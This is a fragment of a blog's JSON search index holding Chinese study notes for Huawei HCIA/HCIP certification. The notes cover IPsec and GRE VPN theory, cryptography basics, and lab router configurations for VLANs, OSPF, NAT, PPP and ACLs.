：网卡绑定","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"防火墙","slug":"防火墙","permalink":"http://sakuramuxia.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Eth-Trunk链路聚合","slug":"Eth-Trunk链路聚合","permalink":"http://sakuramuxia.github.io/tags/Eth-Trunk%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记4","slug":"hcnp04","date":"2021-05-12T10:20:53.000Z","updated":"2021-06-01T16:21:28.184Z","comments":true,"path":"post/4455.html","link":"","permalink":"http://sakuramuxia.github.io/post/4455.html","excerpt":"","text":"IPsec VPN配置（手动配置）IPsec VPN配置步骤 实验拓扑 sys sys HF dhcp enable acl 2000 rule permit so 192.168.10.0 0.0.0.255 int g0/0/0 ip add 192.168.10.254 24 dhcp sel int int g0/0/1 ip add 12.0.0.1 24 //net outbound 2000 ip route-s 0.0.0.0 0 12.0.0.2 --------------------------------------- //合肥 //配置感兴趣流 --------------------------------------- acl 3000 rule permit ip(协议) so 192.168.10.0 0.0.0.255 des 192.168.20.0 0.0.0.255 --------------------------------------- //配置提议 --------------------------------------- dis IPsec sa //验证IPsec SA dis IKE sa //验证IKE SA dis IPsec proposal //验证IPsec提议 IPsec proposal HF2SH //配置IPsec 名字随意配 dis IPsec proposal //验证IPsec提议，当只新建一个IPsec，什么都不配置的时候，默认值封装模式为Tunnel，安全协议为ESP，认证算法为MD5，加密算法为DES。 //transform ah //将安全协议更改成AH ESP encryption-algorithm AES-256 //配置加密算法 ESP Authentication-algorithm sha2-256 //配置认证算法 d th //手动的话是永久存在的，没有配置超时时间的选项。 //当选择安全协议为ESP时可以配置的有两个，当选择安全协议为AH时，可以配置的只有认证算法。 --------------------------------------- //配置IPsec 策略 --------------------------------------- //先配置IPsec proposal 再配置IPsec policy IPsec policy HF2SH 1 manual //名称 序列号 手动orIKE dis IPsec policy //验证IPsec策略配置 security acl 3000 //引入感兴趣流 proposal HF2SH //引入提议 tunnel local 12.0.0.1 //配置隧道本端地址，为公网地址 tunnel remote 23.0.0.3 //配置隧道对端地址，为对端公网地址 dis ipsec policy //验证IPsec策略配置 sa spi inbound esp 12345 //配置SPI序列号 sa spi outbound esp 12345 //可以配置相同的spi序列号 sa string-key inbound ESP cipher 123.com //配置入方向预共享密钥加密 sa string-key outbound ESP cipher 123.com //配置出方向预共享密钥加密 dis IPsec policy //验证IPsec策略 int g0/0/1 //进入相关接口 IPsec policy HF2SH // 调用策略 //当更改协议后需要重新调用一下 dis IPsec sa bri//验证IPsec sa 配置 （简化） dis IPsec sa duration //验证IPsec协议生存时间 dis IPsec statistics ESP //查看IPsec数据包入和出 -------------------------------------------------------- //这样配置VPN会通，但是无法访问互联网了。所以还要把NAT转发开启，但是开启之后，因为IPsec策略的源地址是私网地址，NAT转发之后会变成公网地址，数据包有去无回，造成无法通信，所以要把IPsec的源地址变成出去对应的公网地址。 acl 3000 rule permit ip(协议) so 192.168.10.0 0.0.0.255 des 192.168.20.0 0.0.0.255 //源地址192.168.10.1变成12.0.0.1 //还有一种解决办法就是把NAT调用的acl把VPN的流量排除，感兴趣流仍然写成对应的私网地址，这样也更符合使用习惯。 --------------------------------------------------------- acl 3001 rule deny ip so 192.168.10.0 0.0.0.255 des 192.168.20.0 0.0.0.255 rule permit ip so --------------------------------------------------------- int g0/0/1 //进入相关的接口 nat outbound 3001 //NAT调用acl debugging ? //调试信息 terminal debugging //开启debugging调试 debugging NAT ? //查看debugging nat信息 debugging IPsec all -------------------------------------------------------- sys sys SH dhcp enable acl 2000 rule permit so 192.168.20.0 0.0.0.255 int g0/0/1 ip add 192.168.20.254 24 dhcp sel int int g0/0/0 ip add 23.0.0.3 24 net outbound 2000 ip route-s 0.0.0.0 0 23.0.0.2 sys sys ISP int g0/0/0 ip add 12.0.0.2 24 int g0/0/1 ip add 23.0.0.2 24 int lo 2 ip add 2.2.2.2 32 手动配置对比图形化界面配置 创建安全提议配置过程 静态手动配置的需要用流量触发。 手动配置IPsec ping -a xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy //以x的身份ping y ping -a xxx.xxx.xxx.xxx yyy.yyy.yyy.yyy //以x的身份ping y IPsec配置案例（IKE协商）-------------------------------------------- //配置IKe提议 IKE proposal 1 //新建一个IKE提议序列号1 dis IKE proposal //查看IKE提议默认值 //IKE协商中由一个默认的配置，认证算法为SHA1，加密为DES，生存时间86400，PRF算法为SHA。 authentication-algorithm SM3//配置认证算法 authentication-method pre-share//配置认证模式预共享密钥 encryption-algorithm aes-cbc-256//配置加密算法AES DH group ? //配置DH group组 sa duration //配置超时时间 prf ? //配置prf完全向前保密，加强保密算法 ------------------------------------------ //配置对等体,协商 IKE peer SH V1//配置IKE协商版本为V1 dis IKE peer //查看IKE协商默认值 //默认不做配置的传输模式为主模式，Nat穿越为关闭, exchange-mode main //配置交换模式为主模式 pre-share-key cipher huawei //配置预共享密钥 IKE-proposal 1 //调用Ike提议 local-address 12.0.0.1 //配置本段IP remote-address 23.0.0.3 //配置对端IP ------------------------------------------ //创建一个新的策略进行关联 ipsec policy SH2HF 1 isakmp //创建ipsec安全策略 security acl 3000 //关联acl策略（和手动一样） proposal HF2SH //关联提议 ike-peer SH //调用对等体 ------------------------------------------ //进入接口进行调用 int g0/0/1 d th undo ipsec policy ipsec policy hefei2shanghai ------------------------------------------ //配置ike的脚本软件，直接把参数输入进去，然后运行脚本，就把命令刷出来了，直接复制粘贴 ------------------------------------------- 得用IKE的提议建立一个IKE的SA，在IKE的情况下建立一个IPsec的SA，再调用提议。 IKE配置 验证ipsec配置dis ike sa dis ipsec sa GRE over IPsec技术背景：IPsec VPN用于在两个端点之间提供安全的IP通信，但只能加密并传播单播数据，无法加密和传输语音，视频，动态路由协议信息等组播数据流量。 GRE可以封装组播数据，并可以和IPsec结合使用，从而保证语音，视频等组播业务的安全。 工作流程首先通过GRE对报文进行封装，然后再由ipsec对封装后的报文进行加密和传输。 说明： 在原始的包头上添加GRE封装的公网IP包头，如果用的IPsec模式是tunnel模式的话还会在外层再添加一个IP包头，会出现最多有3个包头。或两个包头（传输模式），实际中只能看到最外面的一层IP包头，里层的数据都进行了加密，是看不到的。 在配置的时候注意，先做GRE，再做IPsec保护GRE。 -------------------------------------------- //合肥配置 -------------------------------------------- sys sys HF dhcp enable acl 3001 rule permit ip int g0/0/0 ip add 192.168.10.254 24 dhcp sel int int g0/0/1 ip add 12.0.0.1 24 nat outbound 3001 ip route-s 0.0.0.0 0 12.0.0.2 //配置GRE int tunnel0/0/0 tunnel-protocol gre //封装协议为GRE so 12.0.0.1 //隧道源地址 des 23.0.0.3 //隧道目的地址 IP add 192.168.12.1 24 //隧道配置IP地址 //配置ospf ospf 1 router-id 1.1.1.1 area 0 //宣告内网口和隧道口 net 192.168.10.0 0.0.0.255 //宣告内网地址 net 192.168.12.0 0.0.0.255 //宣告隧道地址 //配置ipsec //配置感兴趣流公网加密的 acl 3000 rule permit GRE so 12.0.0.1 0 0.0.0.255 des 23.0.0.3 0 0.0.0.255 //配置提议 ipsec proposal HF2SH transform esp ESP authentication-algorithm sha2-256 esp encryption-algorithm AES-256 //配置策略 ipsec policy HF2SH 1 manual security acl 3000 proposal HF2SH tunnel local 12.0.0.1 tunnel remote 23.0.0.3 sa spi inbound esp ciper 123.com sa string-key outound esp cipher 123.com //调用 ipsec policy HF2SH ---------------------------------------- //上海配置 ---------------------------------------- sys sys SH dhcp enable acl 3001 rule permit ip int g0/0/1 ip add 192.168.20.254 24 dhcp sel int int g0/0/0 ip add 23.0.0.3 24 nat outbound 3001 ip route-s 0.0.0.0 0 23.0.0.2 //配置GRE int tunnel0/0/0 tunnel-protocol gre //封装协议为GRE so 23.0.0.1 //隧道源地址 des 12.0.0.3 //隧道目的地址 IP add 192.168.12.2 24 //隧道配置IP地址 //配置ospf ospf 1 router-id 3.3.3.3 area 0 //宣告内网口和隧道口 net 192.168.20.0 0.0.0.255 //宣告内网地址 net 192.168.12.0 0.0.0.255 //宣告隧道地址 //配置ipsec //配置感兴趣流公网加密的 acl 3000 rule permit GRE so 23.0.0.3 0 0.0.0.255 des 12.0.0.1 0 0.0.0.255 //配置提议 ipsec proposal SH2HF transform esp ESP authentication-algorithm sha2-256 esp encryption-algorithm AES-256 //配置策略 ipsec policy SH2HF 1 manual security acl 3000 proposal SH2HF tunnel local 23.0.0.3 tunnel remote 12.0.0.1 sa spi inbound esp ciper 123.com sa string-key outound esp cipher 123.com //调用 ipsec policy SH2HF 说明： 1、ospf的hello数据包 10秒钟一个 2、对专线与专网应在不同语境下使用的两个词，没有必然联系。专线：物理层面，强调的是你使用一条或多条专有的物理传输线路。专网：使用性质层面，强调的是用途，这个网专门用于干嘛的，专注于某一个特定人群、行业、目的等等。比如军队专网、交通专网等。专线与专网没有必然联系，专网的建立依赖与底层（物理层）的传输链路与设备，这个物理层的东西可以是专线也可以不是（若没有安全方面的考虑话）；而专线呢，你可以拉条专线上因特网，也可以专门用来承载专网的业务。 也有ADSL专线上网，也就是ADSL＋专线。 专网的说法有很多，有把专线＋交换机实现的VOIP，叫做专网，也有叫综合语音接入。","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"IPsec 配置","slug":"IPsec-配置","permalink":"http://sakuramuxia.github.io/tags/IPsec-%E9%85%8D%E7%BD%AE/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记3","slug":"hcnp03","date":"2021-05-07T16:20:53.000Z","updated":"2021-05-07T17:18:53.228Z","comments":true,"path":"post/c896.html","link":"","permalink":"http://sakuramuxia.github.io/post/c896.html","excerpt":"","text":"你不去做的事情，永远都不会实现 IPsec VPN企业对网络安全性的需求日益提升，而传统的TCP/IP协议缺乏有效的安全认证和保密机制。IPsec（Internet Protocol Security）作为一种开放标准的安全框架结构，可以用来保证IP数据报文在网络上传输的机密性、完整性和防重放。 IPsec Internet Protocol Security 源自IPV6 IETF指定的一套安全保密性能框架 建立在网络层的安全保障机制 引入多种加密算法、验证算法和密钥管理机制 也具有配置复杂、消耗运算资源较多、增加延迟、不支持组播等缺点 IPsec VPN是利用IPsec隧道建立的VPN技术 OSPF V3版本 建立在网络层的安全保障机制，IP头部后边的数据进行加密。 IPsec核心功能 拓展： PSK：预共享密钥 证书搭建：用Windows的AD域来搭建证书服务 HMAC：基于消息摘要认证加密算法，对加密的数据做一个哈希，再用自己的私钥加密叫做数据签名，现在这里边他会加入一些信息，比如说他会加入一个随机数，这个随机数叫X，加入随机数后，在一起计算的这个技术叫做HMAC，这个HMAC后边用作完整性、真实性校验 IPsec技术框架 IPsec Protocol IPsec协议 confidentiality 机密性 Data Integrity 数据完整性 Origin Authentication 源认证 Key Management 密钥管理 IKE：IKE协议提供密钥协商，用来协商通道，建立和维护安全联盟SA等服务。 通过AH和ESP这两个安全协议来实现IP数据报文的安全传送 SA：SA安全联盟 建议ESP 特定地点，特定时间，特定任务，特定特征， 事先协商好 街头后，再聊，再给任务 IPsec安全协议 IPsec封装模式 说明： IPsec头就是指AH或ESP或者AH+ESP 隧道模式就是跟GRE模式一样 传输模式就是不加新的包头 说明： 当使用GRE封装的隧道模式将出现3个IP包头，一个是原IP包头，一个是GRE封装的新包头，一个是隧道模式下封装的IPsec新IP包头，但是外部只能看到一个IP包头，原因是后边的被加密了，但是数据包封装的结构是三个IP包头。 传输模式封装结构 隧道模式封装结构 Windows安全策略 安全联盟SA（Security Association） 顾名思义，通信双方结成盟友，互相信任亲密无间，即达成约定。 由一个（SPI，IP目的地址，安全协议号）三元组唯一标识。 决定了对报文进行何种处理：模式、协议、算法、密钥、生存周期等。 每个IPsec SA都是单向的。 可以手工建立或通过IKE协商生成。 SPD（Security Policy Database）安全策略数据库 SAD（Security Association Database） 术语 备注 Negotiate 协商，两个节点要开始安全发送数据之前，必须完成的事情 SA Security Association 安全联盟，协商的结果，类似合约书 SPI Security Parameter Index 安全参数索引，SA内包含，用于区分多个SA IKE Internet Kev Exchange，因特网密钥交换，SA协商的方法和标准。 IKE 用来协商通道的 IPsec SA用来保护数据的 IKE协商过程 最终会协商出一个隧道 nat user xxx /add //建立Windows用户 nat user xxx yyy //创建用户密码 IKEInternet Key Exchange 因特网密钥交换 建立在ISAKMP （Internet安全联盟和密钥管理协议）定义的框架上 基于UDP（端口号500）的应用层协议，可为数据加密提供所需的密钥 使用DH算法，在不安全的网络上安全地分发密钥，验证身份 定时更新SA和密钥，实现完善的向前安全性 允许IPsec提供抗重播服务（添加有随机数） 简化IPsec的使用和管理，大大简化了IPsec的配置和维护工作 IKE在中间的作用：SA会建立两种SA，一种是IKE SA，一种是IPsec SA，IKE SA主要是协商后边通道的，在通道中传数据的时候，数据的加密使用的是IPsec SA来进行的。先做IKE的协商，再做IPsec的协商。 IKE是一种框架 PFS：prefect Forward Security 完全向前保密，类似DH，用于密钥管理分发，但是做一次额外的密钥交换。 当私钥泄漏时，就必然会导致之前的数据被破解，但是保证未来的数据能被保护。 IKE在协商过程中有两个阶段 对等体之间建立一个IKE SA完成身份验证和密钥信息交换后，在IKE SA的保护下，根据配置的AH/ESP安全协议等参数协商出一对IPsec SA。 阶段1主模式协商过程 说明： 主模式中有加密的过程，推荐使用主模式，但是在早期的设备中不支持加密的信息，所以选择野蛮模式。 PRF算法：数据做校验的时候，额外添加的算法。 IKE的版本有V1还有V2，其中V2种有支持多种算法。 野蛮模式协商过程 阶段2快速模式 IKE SA 与IPsec SA的区别 实际过程中的界面配置基本配置 IKE通道配置 IPsec配置 //科来数据抓包中过滤IPsec的数据包支持的类型有 AH、ESP、isakmp、 //科来过滤指定的IP地址 ip.addr == 114.114.114.114","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"IPsec VPN","slug":"IPsec-VPN","permalink":"http://sakuramuxia.github.io/tags/IPsec-VPN/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记2","slug":"hcnp02","date":"2021-05-06T06:01:53.000Z","updated":"2021-05-06T07:00:43.672Z","comments":true,"path":"post/857.html","link":"","permalink":"http://sakuramuxia.github.io/post/857.html","excerpt":"","text":"信息安全 信息安全的核心目标CIA模型保护 PKI公钥基础架构 机密性技术 机密技术分类 根据密钥的使用方法 对称加密 对称加密：加密、解密使用相同的密钥 特点：速度快、密文紧凑、密钥管理复杂、用于大量数据的传送 Encrypt ：加密 Date Encrypt Standard 数据加密标准 Dencrypt ：解密 说明： 加密的理念是转换和移位 非对称加密 加密、解密使用不同的密钥（公钥、私钥） 特点：速度慢、密文不紧凑、密钥管理简单、通常只用于数字签名。 公加私解，私加公解。 京东只需要把他的公钥给我们即可，然后我们用他们的公钥进行加密，发送过去，数据到他们那里，只有他们手中的私钥可以解密。（这是去的过程）同理，来的过程也是。 私加公解的意义是为了数字签名，进行身份认证的作用。 不要使用任何非公开的加密算法 说明： DH：迪尔夫丶霍夫曼，两个人的名字简写，是一种加密算法。相当于把对称加密的密钥当作数据用非对称加密的进行传送交换。 PRF：伪随机函数 公钥加密技术 非对称加密也叫公钥加密，是PKI的基础 公钥（public Key）和私钥（Private Key） 根据实现的功能不同，可以分为数据加密和数字签名 延伸：加密软件：PGP（pretty Good Privacy）优良保密协议是一套用于消息加密、验证的应用程序，可以加密一个分区，创建一个加密分区，整个硬盘。 数据加密-数字信封发送方采用接收方的公钥来加密对称密钥。采用数字信封时，接收方需要使用自己的密钥才能打开数字信封得到对称密钥。结合对称加密和非对称加密的各自优点 注意：这个里面有漏洞就是无法确认发送方的身份和数据的完整性。 两种加密算法的结合在实际使用中，通信双方通常会使用公钥密码学来交换密钥素材，双方最终计算出密钥，而用对称密码学来加密实际的数据，两者配合使用，保证了加密速度和安全性。 真实性验证私钥加密，公钥解密，用于证明身份 完整性技术信息摘要:单向散列函数，哈希（Hash） 将任意长的字符串通过哈希计算出固定长度字符串，类似指纹、DNA 特点：不可逆，雪崩效应 延伸：collision 碰撞，冲突 抽屉定律：6本书，5个抽屉，那么肯定有一个抽屉里面有两本书。 哈希算法碰撞理论起源：定长的，所以结果是有限的，但我们的数据是无限的，总能找到两个不同的数据，他们的哈希值是一样的。 哈希加密：只是哈希隐藏了密码，它只是一个算法。即输入一个密码，系统做一个哈希，如果得到的哈希值跟系统中存储的哈希值一样则代表密码正确。系统中实际存储的是密码的哈希值，而不是密码。 数字签名说明这是我的唯一性 签名具有不可否认性 摘要是指哈希值 数字签名就是对数据摘要加密（自己的私钥）的一个密文 这其中还有一个问题就是怎么证明 公钥是他们本人的。 公钥技术的规模应用难题 载体：证书证书：证明我的公钥是我自己 certmgr.msc \\\\查看颁发的证书 PKI协议的应用 IPsec用的Hmac消息认证码","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"信息安全","slug":"信息安全","permalink":"http://sakuramuxia.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"author":"SakuraMuxia"},{"title":"HCNP学习笔记1","slug":"hcnp01","date":"2021-04-28T10:01:53.000Z","updated":"2021-05-03T06:09:25.515Z","comments":true,"path":"post/917.html","link":"","permalink":"http://sakuramuxia.github.io/post/917.html","excerpt":"","text":"VPN基础VPN产生背景： 在Internet的传输中，绝大部分数据的内容都是明文传输的，存在很多安全隐患（如：窃听、篡改、冒充） 总部、分公司、办事处、出差人员、合作单位需要访问总部网络资源的问题。 ------------------ CRM:客户资源管理 钉钉 ERP:企业资源计划 金蝶 OA:互联网办公 SAP: ------------------ 从外部访问企业内网资源 1、NAT服务器、端口映射 方便 开口 2、VPN 安全 ------------------- HTTP HTTPS FTP SFTP Telnet SSH ------------------- 社会工程学SE 人 最大的弱点 ------------------- CISP CISSP CIA ------------------- VPN没有之前 用的 专线 ------------------- 深信服 启明星辰 绿盟 安全厂商 网络安全厂商 安全牛 ------------------- VPNVirtual Private Network，虚拟专用网络 术语 备注 VPN 通过公共网络建立私有网络，并提供一定的安全性和服务质量保证。IETF草案对基于IP的VPN的定义：使用IP机制仿真出一个私有的广域网 虚拟 用户不再需要拥有实际的专线，而是利用Internet建立自己的私有网络。 专用 用户可以为自己制定一个最符合自己需求的网络。 VPN核心技术 说明：windows Services都可以 VPN优点: VPN类型（根据建设单位划分） 类型 备注 租用运营商专线搭建VPN网络 MPLS VPN（工作量很大） 用户自建企业VPN网络 GRE、PPTP、L2TP、IPSec、SSL VPN IGP→路由策略→BGP→MPLS→MPLS VPN 类型 备注 Remote-Access VPN 远程访问VPN 适合出差员工，移动办公等VPN拨号接入的场景。员工可以在任何能够接入公网的地方，通过远程拨号接入企业内网，从而访问内网资源。通常拨号方IP地址不固定。 Site-to-Site VPN 站点到站点VPN 适合各分支机构、合作伙伴、客户、供应商间的互联、双方都有固定的IP地址。 IPsec VPN SSL VPN Site to Site 站点到站点 L2L 局域网到局域网 VPN类型（根据实现层、协议划分） HTTPS → S代表的也是 SSL PPTP 微软； L2F 思科； L2TP IKE SSL；T：Tunnel隧道 P：protocol 协议 IPV6跨越IPv4再到IPv6，这个时候会用到GRE，GRE最强的隧道技术 Easy Connect 深信服产品 拨号的形式 SSL 端口443 HTTP端口443 LNS代表服务器，LAC代表客户端。 L2TP端口号：UDP 1701 PPTP端口号：TCP 1723 有的拨号不支持更改端口号 GRE VPNGeneric Routing Encapsulation 通用路由封装 GRE提供了将一种协议的报文封装在另一种协议报文中的机制，是一种隧道封装技术，GRE可以封装组播数据，并可以和IPsec结合使用，从而保证语音、视频等组播业务的安全。 一种三层VPN封装技术 在任意一种网络协议上传送任意一种其他网络协议的封装方法 解决了跨越异种网络的报文传输问题，异种报文传输的通道称为Tunnel（隧道） GRE核心功能：建立隧道，打通私网 动态路由 RIP 最多15跳 IPsec 用来保护GRE 实验 --- R1 CFG --- sys sys R1 dhcp ena acl 2000 rule 1 permit so 192.168.10.0 0.0.0.255 int g0/0/0 ip add 192.168.10.254 24 dhcp sel int int g0/0/1 ip add 12.0.0.1 24 interface Tunnel 0/0/1 ip add 192.168.13.1 24 tunnel-protocol gre source 12.0.0.1 destination 23.0.0.1 ip route-s 192.168.20.0 255.255.255.0 192.168.13.2 IP route-s 0.0.0.0 0 12.0.0.2 nat outbound 2000 OSPF 1 router-id 1.1.1.1 area 0 net 192.168.10.0 0.0.0.255 net 192.168.13.0 0.0.0.255 --- R3 CFG --- sys sys R3 dhcp ena acl 2000 rule 1 permit so 192.168.20.0 0.0.0.255 int g0/0/1 ip add 192.168.20.254 24 dhcp sel int int g0/0/0 ip add 23.0.0.1 24 nat outbound 2000 interface Tunnel 0/0/1 ip add 192.168.13.2 24//这个IP配制成如何都无所谓 tunnel-protocol gre source 23.0.0.1 destination 12.0.0.1 ip route-s 192.168.10.0 255.255.255.0 192.168.13.1//告诉路由器当查找路由表时走隧道口，不走缺省路由，进行重新封装。 IP route-s 0.0.0.0 0 23.0.0.2 //配置动态路由 OSPF 1 router-id 1.1.1.1 area 0 net 192.168.20.0 0.0.0.255 net 192.168.13.0 0.0.0.255 --- R2 CFG --- sys sys R2 int g0/0/0 ip add 12.0.0.2 24 int g0/0/1 ip add 23.0.0.2 24 int lo 2 ip add 2.2.2.2 32 --- 网络拓扑下载：https://liubei688.lanzoui.com/iYoHhokl44d GRE封装：穿马甲 47代表GRE；0X0800代表上层IPV4； 协议ID GRE VPN转发过程详解 让私网地址的数据包从隧道口出去，到下一跳的隧道口。 隧道口（因为隧道是建立在三层上所以有IP地址）的IP地址都可以随意配，不一定在同一个网段，因为隧道是一个PPP的点到点的认证 本质是：隧道口只是为了让去往这个目的地的路由走这个口，这样才能发现我要去做一个重新的封装。 GRE VPN的配置 命令 备注 interface tunnel 0/0/1 创建隧道口 tunnel-protocol GRE 指定协议 source 12.0.0.2 指定隧道源（公网IP） destination 13.0.0.3 指定隧道目标（公网IP） 配置IP地址、路由 注意下一跳、出站口、宣告口 display interface tunnel 0/0/1 查看隧道口状态 keepalive period 5 retry-times 3 开启Keeplive检测避免数据黑洞 说明：隧道口也是三层口 思科的设备默认开启的协议是GRE 配置路由时 下一跳出接口的时候一定注意，出接口是本地隧道口的出接口（IP），下一跳是对端隧道口的入接口（IP）。要让它走隧道口 而不是走缺省路由，NAT。 配置路由// 配置静态隧道路由 ip route-s 192.168.20.0 255.255.255.0 Tunnel0/0/1 //配置隧道的路由 ip route-s 192.168.20.0 255.255.255.0 192.168.13.2 //配置隧道的路由 //配置动态隧道路由 OSPF 1 router-id 1.1.1.1 area 0 net 192.168.10.0 0.0.0.255 net 192.168.13.0 0.0.0.255 OSFP 1 router-id 2.2.2.2 area 0 net 192.168.20.0 0.0.0.255 net 192.168.13.0 0.0.0.255 ----------------------------- //通过公网跑了一个OSPF路由 配置验证 GRE VPN 路由宣告注意事项 // 当把公网接口也宣告进去的时候，在封装好私网地址时，查找路由表，发现去往目的路由在路由表中已经出现，并且下一跳仍然是隧道口，再次进行封装，一直递归下去。路由递归， recursive GRE VPN隧道口虚假状态问题： 只要有到达隧道目标的路由，隧道口即可激活。 解决办法：开启GRE的Keeplive，用于检测隧道对端是否可达。 Keeplive就如同OSPF里的Hello包，每隔多少秒发一次。可以两边都打开，也可以只开一边。 //查看到达目标地址的路由 dis ip rout xx.xx.xx.xx keeplive 5 retry-time 3 //每5秒发一次 重传3次 GRE安全机制 GRE安全机制配置 int tunnel 0/0/1 d th gre checksum //开启GRE校验和 gre key xxx //设置KEY 说明：GRE中的机制在数据包中都能抓到KEY // 隧道口的IP地址随意配置 只是在建立路由的时候填写对应的下一跳即可。因为双方通讯数据包里封装的是公网地址和私网地址跟隧道口的地址没有关系。 //隧道口是直连的 //当填写的隧道口的IP地址不在同一个网段的时候,添加静态路由 ip rout-s 192.168.3.3(对端隧道地址) Tunnel 0/0/1(本端隧道出口) 两个不在同一个网段，能通但是没有ARP，原因是ICMP协议的数据包中，封装的MAC地址源MAC是公网出接口的MAC，目的MAC是对端运营商的出MAC，已经知道了MAC地址，就不需要ARP //添加动态路由 OSPF 1 a 0 net 172.168.1.1 0.0.0.0 //宣告动态路由","categories":[{"name":"技术","slug":"技术","permalink":"http://sakuramuxia.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HCIP","slug":"HCIP","permalink":"http://sakuramuxia.github.io/tags/HCIP/"},{"name":"GRE","slug":"GRE","permalink":"http://sakuramuxia.github.io/tags/GRE/"}],"author":"SakuraMuxia"},{"title":"HCIA学习笔记17","slug":"hcia17","date":"2021-04-25T10:01:53.000Z","updated":"2021-05-03T06:09:01.516Z","comments":true,"path":"post/e69b.html","link":"","permalink":"http://sakuramuxia.github.io/post/e69b.html","excerpt":"","text":"HCNA综合实验配置要求 //配置说明 //配置所需的IP地址，都已在拓扑上标注。 //配置要求 配置Telnet，要求所有网络设备均支持远程管理，密码为admin。 配置Trunk，交换机之间的链路均为Trunk模式。 配置VLAN，在SW2和SW3上创建相关VLAN，关联4台pc到对应的VLAN接口。 配置mls，通过sw1实现VLAN间路由。 配置dhcp，使sw1可以为各个VLAN内主机分配地址信息。 配置stp，使sw1成为所有vlan的根桥，要求手动修改优先级为4096。 配置ospf，企业内网运行OSPF1。 配置缺省和NAT，在R1上配置静态路由，sw1通过OSPF学习缺省路由。 配置NAT，在R1上配置PAT（只需要转换四个VLAN网段）。 配置PPP，R1和R2之间封装协议为PPP，使用CHAP双向认证，密码为love。 配置OSPF，R2和R3和R4之间运行OSPF2 配置DNS，可以通过www.wakin.com访问HTTP服务器，通过www.movie.com访问FTP服务器。 配置ACL，在R1上配置ACL，拒绝VLAN20的主机通过浏览器访问HTTP服务器，其他流量不受影响。 拓扑文件下载地址：https://liubei688.lanzoui.com/icYBHoj3yni -------------------- -------------------- sys sys SW2 vlan bat 10 20 30 40 int Eth0/0/2 p l a p d v 10 int Eth0/0/3 p l a p d v 20 int Eth0/0/4 p l t p t a v 10 20 30 40 int Eth0/0/1 p l t p t a v 10 20 30 40 int Eth0/0/5 p l a p d v 20 ---------------------- ---------------------- sys sys SW3 vlan bat 10 20 30 40 int Eth0/0/2 p l a p d v 30 int Eth0/0/3 p l a p d v 40 int Eth0/0/4 p l t p t a v 10 20 30 40 int Eth0/0/1 p l t p t a v 10 20 30 40 ------------------------ ------------------------ sys sys SW1 vlan bat 10 12 20 30 40 int Eth0/0/2 p l t p t a v 10 20 int Eth0/0/3 p l t p t a v 30 40 int Eth0/0/1 p l a p d v 12 int vlanif 12 ip add 192.168.12.1 24 int vlanif 10 ip add 192.168.10.1 24 int vlanif 20 ip add 192.168.20.1 24 int vlanif 30 ip add 192.168.30.1 24 int vlanif 40 ip add 192.168.40.1 24 ospf 1 router-id 5.5.5.5 area 0 net 192.168.10.0 0.0.0.255 net 192.168.20.0 0.0.0.255 net 192.168.30.0 0.0.0.255 net 192.168.40.0 0.0.0.255 net 192.168.12.1 0.0.0.0 dhcp enable int vlanif 10 dhcp select interface dhcp server dns-list 3.0.0.1 int vlanif 20 dhcp select interface dhcp server dns-list 3.0.0.1 int vlanif 30 dhcp select interface dhcp server dns-list 3.0.0.1 int vlanif 40 dhcp select interface dhcp server dns-list 3.0.0.1 stp root primary stp priority 0 //设置成根桥 ------------------------- sys sys R1 int g0/0/0 ip add 192.168.12.2 24 int Ser4/0/0 ip add 12.0.0.1 24 acl 2000 rule 1 permit acl 3000 rule 1 deny tcp so 192.168.20.0 0.0.0.255 dest 4.0.0.1 0 dest eq 80 int Ser4/0/0 ppp chap user wakin ppp chap password cipher love ip route-static 0.0.0.0 0 12.0.0.2 ospf 1 router-id 2.2.2.2 area 0 net 192.168.12.2 0.0.0.0 default-route-advertise int Ser4/0/0 nat outbound 2000 int g0/0/0 traffic-filter inbound acl 3000 --------------------------- sys sys R2 int g0/0/0 ip add 23.0.0.1 24 int g0/0/1 ip add 24.0.0.1 24 int Ser4/0/0 ip add 12.0.0.2 24 int Ser4/0/0 link-protocol ppp ppp authentication-mode chap aaa local-user wakin password cipher love local-user wakin service-type ppp ospf 1 router-id 1.1.1.1 area 0 net 23.0.0.1 0.0.0.0 net 24.0.0.1 0.0.0.0 net 12.0.0.2 0.0.0.0 dis ip routing-table pro ospf //验证OSPF建立信息 dis cu //查看全部配置信息 -------------------------------- sys sys R3 int g0/0/0 ip add 23.0.0.2 24 int g0/0/1 ip add 34.0.0.1 24 int g0/0/2 ip add 3.0.0.2 24 ospf 1 router-id 2.2.2.2 area 0 net 23.0.0.2 0.0.0.0 net 34.0.0.1 0.0.0.0 net 3.0.0.0 0.0.0.255 ---------------------------------- sys sys R4 int g0/0/0 ip add 24.0.0.2 24 int g0/0/1 ip add 34.0.0.2 24 int g0/0/2 ip add 4.0.0.2 24 ospf 1 router-id 3.3.3.3 area 0 net 24.0.0.2 0.0.0.0 net 34.0.0.2 0.0.0.0 net 4.0.0.0 